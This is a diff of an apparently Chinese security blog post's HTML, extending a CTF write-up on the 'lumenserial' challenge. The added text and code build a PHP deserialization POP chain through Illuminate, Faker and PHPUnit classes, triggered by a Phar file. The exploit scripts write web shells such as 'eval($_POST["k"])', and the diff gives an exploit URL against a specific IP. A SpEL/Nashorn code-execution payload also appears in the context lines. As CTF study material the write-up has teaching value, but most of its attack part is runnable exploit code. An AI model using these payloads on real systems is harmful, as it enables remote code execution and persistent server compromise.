@@ -261,7 +261,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">4,011</span> / Reading time: <span class="post-count">23 min</span></span>
+                        <span>Word count: <span class="post-count">4,667</span> / Reading time: <span class="post-count">27 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -437,19 +437,46 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;code...&quot;),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())&#125;</span><br></pre></td></tr></table></figure>
 <p><img src="/assets/java_secure/FlbrchEql40MmGLz9ECw8fsxxSAA.jfif" alt=""></p>
 <p><strong>Java 1.8后Nashorn取代Rhino(JDK 1.6, JDK1.7)成为Java的嵌入式JavaScript引擎，相比于Python需要安装第三方库，Java可以更容易地在Java里执行JavaScript代码。  我们可以在命令行里使用jjs来测试这个JavaScript解释器。 —– phith0n</strong></p>
-<h1 id="lumenserial"><a href="#lumenserial" class="headerlink" title="lumenserial"></a>lumenserial</h1><p>漏洞比较明显，重要的是找POP链。太菜，复现为主。</p>
+<h1 id="lumenserial"><a href="#lumenserial" class="headerlink" title="lumenserial"></a>lumenserial</h1><p>php魔法方法:</p>
+<ul>
+<li>__call()   调用不存在方法时，会调用该方法，可以根据此方法实现php的伪函数重载</li>
+<li>__destruct()   析构函数，当对象销毁时，会调用该方法</li>
+</ul>
+<p>漏洞比较明显，重要的是找POP链。太菜，复现为主。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">private function download($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $maxSize = $this-&gt;config[&apos;catcherMaxSize&apos;];</span><br><span class="line">        $limitExtension = array_map(function ($ext) &#123;</span><br><span class="line">            return ltrim($ext, &apos;.&apos;);</span><br><span class="line">        &#125;, $this-&gt;config[&apos;catcherAllowFiles&apos;]);</span><br><span class="line">        $allowTypes = array_map(function ($ext) &#123;</span><br><span class="line">            return &quot;image/&#123;$ext&#125;&quot;;</span><br><span class="line">        &#125;, $limitExtension);</span><br><span class="line"></span><br><span class="line">        $content = file_get_contents($url);</span><br><span class="line">        $img = getimagesizefromstring($content);</span><br><span class="line"></span><br><span class="line">        if ($img &amp;&amp; in_array($img[&apos;mime&apos;], $allowTypes)) &#123;</span><br><span class="line">            $guesser = ExtensionGuesser::getInstance();</span><br><span class="line">            $ext = $guesser-&gt;guess($img[&apos;mime&apos;]);</span><br><span class="line">            $size = strlen($content);</span><br><span class="line"></span><br><span class="line">            $html_path = app()-&gt;basePath(&apos;html&apos;);</span><br><span class="line">            $upload_path = $this-&gt;fullPath($this-&gt;config[&apos;catcherPathFormat&apos;]);</span><br><span class="line"></span><br><span class="line">            if (in_array($ext, $limitExtension) &amp;&amp; $size &lt;= $maxSize) &#123;</span><br><span class="line">                if (!is_dir(&quot;&#123;$html_path&#125;&#123;$upload_path&#125;&quot;)) &#123;</span><br><span class="line">                    mkdir(&quot;&#123;$html_path&#125;&#123;$upload_path&#125;&quot;, 0777, true);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $filename = \bin2hex(\random_bytes(10)) . &apos;.&apos; . $ext;</span><br><span class="line">                file_put_contents(&quot;&#123;$html_path&#125;&#123;$upload_path&#125;/&#123;$filename&#125;&quot;, $content);</span><br><span class="line"></span><br><span class="line">                return [</span><br><span class="line">                    &quot;url&quot; =&gt; &quot;&#123;$upload_path&#125;/&#123;$filename&#125;&quot;,</span><br><span class="line">                    &quot;source&quot; =&gt; $url,</span><br><span class="line">                    &quot;state&quot; =&gt; &quot;SUCCESS&quot;</span><br><span class="line">                ];</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                throw new FileException(&quot;file extension .&#123;$ext&#125; or size &#123;$size&#125; error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new FileException(&apos;Only support catching image file&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>download函数使用了<code>file_get_contents</code>,可以结合<code>Phar</code>构造反序列化。</p>
 <p>gadget1:</p>
+<p><code>illuminate/broadcasting/PendingBroadcast.php:55</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">namespace Illuminate\Broadcasting &#123;</span><br><span class="line">    class PendingBroadcast</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct(Dispatcher $events, $event)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;event = $event;</span><br><span class="line">            $this-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>通过传递<code>$this-&gt;event</code>执行其他类的<code>__call</code>方法。</p>
+<p>通过传递由于正常类中的<code>dispatch</code>方法中没有调用危险函数，所以只能查找<code>__call</code>方法中执行危险函数的类，并且该类中不存在<code>dispatch</code>方法，因为PHP在调用不存在的方法时，就会调用<code>__call</code>方法。</p>
 <p>gadget2:</p>
+<p><code>fzaninotto/faker/src/Faker/ValidGenerator.php:52</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">namespace Faker&#123;</span><br><span class="line">    class ValidGenerator&#123;</span><br><span class="line">    	public function __construct(Generator $generator, $validator = null, $maxRetries = 10000)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;generator = $generator;</span><br><span class="line">            $this-&gt;validator = $validator;</span><br><span class="line">            $this-&gt;maxRetries = $maxRetries;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        public function __call($name, $arguments)&#123;</span><br><span class="line">            $i = 0;</span><br><span class="line">            do &#123;</span><br><span class="line">                $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</span><br><span class="line">                $i++;</span><br><span class="line">                if ($i &gt; $this-&gt;maxRetries) &#123;</span><br><span class="line">                    die(&apos;error&apos;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; while (!call_user_func($this-&gt;validator, $res));</span><br><span class="line"></span><br><span class="line">            return $res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该类中的<code>__call</code>方法调用了两次危险函数。</p>
+<p><code>call_user_func_array</code>中的<code>$name</code>不可控，且<code>$name=&#39;dispatch&#39;</code>,所以<code>$res</code>也暂时不可控，需要寻找一个新的gadget来使得<code>$res</code>可控，这样在调用<code>call_user_func</code>时，<code>call_user_func</code>的两个参数均可控，就可以写入shell。</p>
 <p>gadget3:</p>
+<p><code>fzaninotto/faker/src/Faker/Generator.php:277</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $attributes)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br><span class="line">public function format($formatter, $arguments = array())</span><br><span class="line">&#123;</span><br><span class="line">    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br><span class="line">public function getFormatter($formatter)</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        return $this-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    .............</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该类中的<code>$attributes</code>可控，可令其为<code>array(&#39;kingkk&#39;)</code>，该类中<code>__call</code>方法中的<code>$method</code>不可控，但是该方法最终会调用<code>getFormatter</code>方法，并且<code>$this-&gt;formatters</code>可控，<code>$method</code>的虽然不可控，但是它的值是确定的，所以返回值也就可控。</p>
+<p>通过嵌套调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$g1 = new \Faker\Generator(array(&apos;kingkk&apos; =&gt; $si ));</span><br><span class="line">$g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));</span><br></pre></td></tr></table></figure>
+<p>这样的话:</p>
+<p><code>$this-&gt;getFormatter($formatter)相当于$this-&gt;getFormatter(&quot;dispatch&quot;)</code>将返回<code>array($g1, &quot;getFormatter&quot;)</code>。</p>
+<p>然后:</p>
+<p><code>return call_user_func_array(array($g1, &quot;getFormatter&quot;), array(&#39;kingkk&#39;));</code></p>
+<p>然后继续调用<code>getFormatter</code>方法:</p>
+<p>这时候，将返回<code>$si</code>。</p>
 <p>gadget4:</p>
+<p><code>phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function invoke(Invocation $invocation)</span><br><span class="line">&#123;</span><br><span class="line">    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br><span class="line">public function getParameters(): array</span><br><span class="line">&#123;</span><br><span class="line">	return $this-&gt;parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>两个参数均可控,其中<code>Invocation</code>只是个接口。找到具体的实现类即可。</p>
 <p>gadget5:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class StaticInvocation implements Invocation, SelfDescribing</span><br><span class="line">&#123;    </span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;parameters = array(&apos;./k.php&apos;,&apos;&lt;?php phpinfo();eval($_POST[&quot;k&quot;]);?&gt;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getParameters(): array</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;parameters;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>exploit:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        public function __construct($events, $event)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;event = $event;</span><br><span class="line">            $this-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line">        function __construct($forma)&#123;</span><br><span class="line">            $this-&gt;formatters = $forma;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class ValidGenerator&#123;</span><br><span class="line">        protected $generator;</span><br><span class="line">        protected $validator;</span><br><span class="line">        protected $maxRetries;</span><br><span class="line"></span><br><span class="line">        public function __construct($generator, $validator, $maxRetries = 10000)&#123;</span><br><span class="line">            $this-&gt;generator = $generator;</span><br><span class="line">            $this-&gt;validator = $validator;</span><br><span class="line">            $this-&gt;maxRetries = $maxRetries;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Invocation&#123;</span><br><span class="line">    class StaticInvocation&#123;</span><br><span class="line">        function __construct($parameters)&#123;</span><br><span class="line">            $this-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Stub&#123;</span><br><span class="line">    class ReturnCallback&#123;</span><br><span class="line">        public function __construct($callback)&#123;</span><br><span class="line">            $this-&gt;callback = $callback;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># exp func call</span><br><span class="line">namespace&#123;</span><br><span class="line">    $exp_func = &quot;file_put_contents&quot;;</span><br><span class="line">    $exp_args = [&quot;C:\\phpstudy2018\\PHPTutorial\\WWW\\ctf\\pwnhub\\lumenserial\\bbbb.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX0dFVFsnMTEnXSk7Pz4=&quot;)];</span><br><span class="line">    $exp_args_obj = new PHPUnit\Framework\MockObject\Invocation\StaticInvocation($exp_args);</span><br><span class="line">    $exp_call_obj = new PHPUnit\Framework\MockObject\Stub\ReturnCallback($exp_func);</span><br><span class="line"></span><br><span class="line">    $tmp_arr = [&quot;gogogo&quot; =&gt; $exp_args_obj];</span><br><span class="line">    $s4_obj = new Faker\Generator($tmp_arr);</span><br><span class="line"></span><br><span class="line">    $get_func_arr = array(&quot;dispatch&quot;=&gt; array($s4_obj, &quot;getFormatter&quot;));</span><br><span class="line">    $s3_obj = new Faker\Generator($get_func_arr);</span><br><span class="line"></span><br><span class="line">    $s2_obj = new Faker\ValidGenerator($s3_obj, array($exp_call_obj,&quot;invoke&quot;), 2);</span><br><span class="line"></span><br><span class="line">    $s1_obj = new Illuminate\Broadcasting\PendingBroadcast($s2_obj, &quot;gogogo&quot;);</span><br><span class="line">    echo urlencode(serialize($s1_obj)).&quot;\n\r\n\r&quot;;</span><br><span class="line">    </span><br><span class="line">    $p = new Phar(&apos;./exploit.phar&apos;, 0);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;);</span><br><span class="line">    $p-&gt;setMetadata($s1_obj);</span><br><span class="line">    $p-&gt;addFromString(&apos;1.txt&apos;,&apos;text&apos;);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以正常序列化以及反序列化:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;events = new \Faker\ValidGenerator();</span><br><span class="line">            $this-&gt;event = &apos;kingkk&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            // $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">            $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Invocation&#123;</span><br><span class="line">    class StaticInvocation&#123;</span><br><span class="line"></span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;parameters = array(&apos;./k.php&apos;,&apos;&lt;?php phpinfo();eval($_POST[&quot;k&quot;]);?&gt;&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function getParameters(): array</span><br><span class="line">        &#123;</span><br><span class="line">            return $this-&gt;parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Stub&#123;</span><br><span class="line">    use PHPUnit\Framework\MockObject\Invocation\StaticInvocation;</span><br><span class="line">    class ReturnCallback&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;callback = &apos;file_put_contents&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function invoke(StaticInvocation $invocation)</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;done\n&quot;;</span><br><span class="line">            return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class ValidGenerator&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $si = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();</span><br><span class="line">            $g1 = new \Faker\Generator(array(&apos;kingkk&apos; =&gt; $si ));</span><br><span class="line">            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));</span><br><span class="line"></span><br><span class="line">            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();</span><br><span class="line"></span><br><span class="line">            $this-&gt;validator = array($rc, &quot;invoke&quot;);</span><br><span class="line">            $this-&gt;generator = $g2;</span><br><span class="line">            $this-&gt;maxRetries = 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __call($name, $arguments)</span><br><span class="line">        &#123;</span><br><span class="line">            $i = 0;</span><br><span class="line">            do &#123;</span><br><span class="line">                $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</span><br><span class="line">                echo &quot;res&quot;.$i . &quot;\n&quot;;</span><br><span class="line">                var_dump($res);</span><br><span class="line">                $i++;</span><br><span class="line">                if ($i &gt; $this-&gt;maxRetries) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; while (!call_user_func($this-&gt;validator, $res));</span><br><span class="line"></span><br><span class="line">            return $res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        function __construct($form)&#123;</span><br><span class="line">            $this-&gt;formatters = $form;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __call($method, $attributes)</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;method:&quot; . $method . &quot;\n&quot;;</span><br><span class="line">            echo &quot;attrubutes\n&quot;;</span><br><span class="line">            var_dump($attributes);</span><br><span class="line">            return $this-&gt;format($method, $attributes);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function format($formatter, $arguments = array())</span><br><span class="line">        &#123;</span><br><span class="line">            return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">        public function getFormatter($formatter)</span><br><span class="line">        &#123;</span><br><span class="line">            if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">                echo &quot;returnGenerator \n&quot;;</span><br><span class="line">                var_dump($this-&gt;formatters[$formatter]);</span><br><span class="line">                return $this-&gt;formatters[$formatter];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $exp = new Illuminate\Broadcasting\PendingBroadcast();</span><br><span class="line">    // print_r(urlencode(serialize($exp)));</span><br><span class="line">    unserialize(serialize($exp));</span><br><span class="line">    // phar</span><br><span class="line">    // $p = new Phar(&apos;./k.phar&apos;, 0);</span><br><span class="line">    // $p-&gt;startBuffering();</span><br><span class="line">    // $p-&gt;setStub(&apos;GIF89a&lt;?php __HALT_COMPILER(); ?\&gt;&apos;);</span><br><span class="line">    // $p-&gt;setMetadata($exp);</span><br><span class="line">    // $p-&gt;addFromString(&apos;1.txt&apos;,&apos;text&apos;);</span><br><span class="line">    // $p-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后，上传生成的文件，然后:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/xxx.gif</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
@@ -1688,9 +1715,176 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 71
+        Total : 76
         </div>
         <!-- search  -->
         
@@ -1717,6 +1911,31 @@
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/posts/33972/">otter-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/posts/21890/">内存取证分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href="/posts/49664/">xmasctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span><a class="archive-post-title" href="/posts/58144/">tp5.x渗透测试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href="/posts/11772/">hxp-ctf</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1785,12 +2004,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
         </li>
     
     
@@ -1880,12 +2099,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
